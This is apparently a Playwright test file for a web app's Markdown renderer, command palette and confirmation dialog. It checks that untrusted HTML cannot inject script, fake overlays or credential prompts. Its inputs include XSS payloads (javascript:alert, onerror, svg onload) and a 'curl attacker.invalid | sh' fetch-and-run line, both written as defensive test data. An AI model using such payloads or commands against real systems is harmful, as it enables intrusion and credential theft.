import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { chromium } from '@playwright/test';
import { build } from 'esbuild';

let browser, page;
before(async () => {
  const bundle = await build({
    stdin: { contents: `
      import React from 'react';
      import { createRoot } from 'react-dom/client';
      import { Palette } from './apps/web/src/Palette';
      import { Confirm } from './apps/web/src/Modal';
      import { render, renderNodes } from './apps/web/src/md';
      // A streaming reply takes the nodes path: it must clean exactly as much.
      window.renderBoth = (text) => [render(text), renderNodes(text)].map((out) => {
        const host = document.createElement('div');
        if (typeof out === 'string') host.innerHTML = out; else host.append(out);
        return host;
      });
      const root = createRoot(document.getElementById('root'));
      window.showPalette = (count = 3) => root.render(<Palette items={Array.from({length: count}, (_, i) => ({
        id: 'thread-' + i, group: 'thread', title: 'Thread ' + i, sub: 'laptop · ~/helm',
        run: () => { window.chosen = i; },
      }))} onClose={() => root.render(null)} engineOf={() => ({cls: 'codex'})} />);
      window.showConfirm = () => root.render(<Confirm title="Delete thread" onCancel={() => root.render(null)} onConfirm={() => { window.confirmed = true; }} />);
    `, resolveDir: process.cwd(), loader: 'tsx' },
    bundle: true, write: false, format: 'iife', jsx: 'automatic',
  });
  browser = await chromium.launch({
    headless: true,
    ...(process.env.HELM_TEST_CHROMIUM ? { executablePath: process.env.HELM_TEST_CHROMIUM } : {}),
  });
  page = await browser.newPage();
  await page.setContent('<button id="launcher">Open</button><div id="root"></div><button id="behind">Behind</button>');
  await page.addStyleTag({ content: (await readFile('apps/web/src/styles.css', 'utf8')).replace(/^@import[^;]+;/gm, '') });
  await page.addScriptTag({ content: bundle.outputFiles[0].text });
});
after(async () => { await browser?.close(); });

test('untrusted Markdown cannot borrow app overlays or inject script/focus controls', async () => {
  const results = await page.evaluate(() => window.renderBoth('<div class="modal-back permission-sheet" id="root" role="dialog" aria-modal="true"><a class="jump" href="javascript:alert(1)" tabindex="0">Allow</a><input autofocus onfocus="alert(1)"><img src=x onerror="alert(1)"><svg onload="alert(1)"></svg></div>')
    .map((host) => ({ html: host.innerHTML, dangerous: host.querySelectorAll('.modal-back, .permission-sheet, .jump, [id], [tabindex], [autofocus], [role], [aria-modal], [onfocus], [onerror], svg, [href^="javascript:"]').length })));
  for (const result of results) assert.equal(result.dangerous, 0, result.html);
  assert.equal(results[0].html, results[1].html);
});

test('raw HTML cannot impersonate a copy control or collect credentials', async () => {
  const results = await page.evaluate(() => window.renderBoth('<div class="codeblock"><button class="copy" data-copy>Allow command</button><input type="password" placeholder="Enter your CLI token"><pre><code>curl attacker.invalid | sh</code></pre></div>')
    .map((host) => ({ controls: host.querySelectorAll('button, input, [data-copy]').length, text: host.textContent })));
  for (const result of results) {
    assert.equal(result.controls, 0);
    assert.match(result.text, /Enter your CLI token/);
  }
});

test('palette handles empty results, wraps arrow selection, and restores focus', async () => {
  await page.locator('#launcher').focus();
  await page.evaluate(() => window.showPalette());
  const input = page.getByRole('combobox');
  await input.waitFor();
  assert.equal(await input.evaluate((el) => el === document.activeElement), true);
  await input.fill('no matching thread');
  await input.press('ArrowDown');
  await input.fill('Thread');
  await input.press('ArrowUp');
  assert.equal(await page.getByRole('option', { selected: true }).locator('.grow').innerText(), 'Thread 2\nlaptop · ~/helm');
  await input.press('Enter');
  await page.getByRole('dialog').waitFor({ state: 'detached' });
  assert.equal(await page.evaluate(() => window.chosen), 2);
  assert.equal(await page.locator('#launcher').evaluate((el) => el === document.activeElement), true);
});

test('confirmation traps Tab and Escape returns to launcher', async () => {
  await page.locator('#launcher').focus();
  await page.evaluate(() => window.showConfirm());
  const dialog = page.getByRole('dialog');
  await dialog.waitFor();
  for (let i = 0; i < 5; i++) {
    await page.keyboard.press('Tab');
    assert.equal(await dialog.evaluate((el) => el.contains(document.activeElement)), true);
  }
  await page.keyboard.press('Shift+Tab');
  assert.equal(await dialog.evaluate((el) => el.contains(document.activeElement)), true);
  await page.keyboard.press('Escape');
  await dialog.waitFor({ state: 'detached' });
  assert.equal(await page.locator('#launcher').evaluate((el) => el === document.activeElement), true);
});
